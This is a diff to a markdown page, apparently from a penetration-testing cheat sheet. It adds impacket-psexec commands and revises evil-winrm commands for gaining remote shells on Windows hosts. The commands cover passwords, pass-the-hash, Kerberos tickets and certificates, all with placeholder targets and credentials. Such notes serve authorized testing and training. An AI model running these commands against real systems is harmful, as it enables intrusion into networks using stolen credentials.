@@ -1,16 +1,47 @@
 ---
-title: "evil-winrm"
+title: "Winrm"
 date: 2024-7-27
-tags: ["Kerberos", "Pass-The-Hash", "RCE", "Evil-Winrm", "Windows", "Pass-The-Ticket", "Pass-The-Cert"]
+tags: ["Kerberos", "Pass-The-Hash", "RCE", "Evil-Winrm", "Windows", "Pass-The-Ticket", "Pass-The-Cert", "Winrm", "Psexec"]
 ---
 
-### Connection Methods
+### Psexec
 
-{{< tab set1 tab1 active >}}Password{{< /tab >}}
+{{< tab set1 tab1 >}}Password{{< /tab >}}
 {{< tab set1 tab2 >}}Hash{{< /tab >}}
-{{< tab set1 tab3 >}}Kerberos{{< /tab >}}
-{{< tab set1 tab4 >}}crt & key{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
+
+```console
+# Domain auth
+impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
+```
+
+```console
+# Local auth
+impacket-psexec '<USER>:<PASSWORD>@<TARGET>'
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+```console
+# Domain auth
+impacket-psexec '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH>
+```
+
+```console
+# Local auth
+impacket-psexec '<USER>@<TARGET>' -hashes :<HASH>
+```
+
+{{< /tabcontent >}}
+
+### Evil-Winrm
+
+{{< tab set2 tab1 >}}Password{{< /tab >}}
+{{< tab set2 tab2 >}}Hash{{< /tab >}}
+{{< tab set2 tab3 >}}Kerberos{{< /tab >}}
+{{< tab set2 tab4 >}}crt & key{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
 
 ```console
 evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'
@@ -30,14 +61,14 @@ Info: Establishing connection to remote endpoint
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set1 tab2 >}}
+{{< tabcontent set2 tab2 >}}
 
 ```console
 evil-winrm -i <TARGET> -u <USER> -H <HASH> 
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set1 tab3 >}}
+{{< tabcontent set2 tab3 >}}
 
 ```console
 # Step 1: Edit '/etc/krb5.conf' (All in uppercase)
@@ -101,7 +132,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set1 tab4 >}}
+{{< tabcontent set2 tab4 >}}
 
 ```console
 evil-winrm -i <TARGET> -S -k auth.key -c auth.crt
